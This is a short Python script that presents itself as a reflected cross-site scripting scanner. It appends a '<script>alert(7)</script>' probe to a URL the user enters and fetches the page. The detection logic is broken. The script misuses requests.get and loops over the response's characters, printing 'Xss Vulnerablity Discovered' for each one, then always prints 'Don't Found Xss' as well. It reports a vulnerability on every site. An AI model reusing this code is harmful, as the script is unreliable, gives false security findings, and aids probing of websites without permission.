import requests

target = input("enter the link name and parameter: ")
payload = "<script>alert(7)</script>"
req = requests.get(target+payload, "html.parser").text

for payload in req:
    print("\_/ Xss Vulnerablity Discovered \_/")
else:
    print("Don't Found Xss")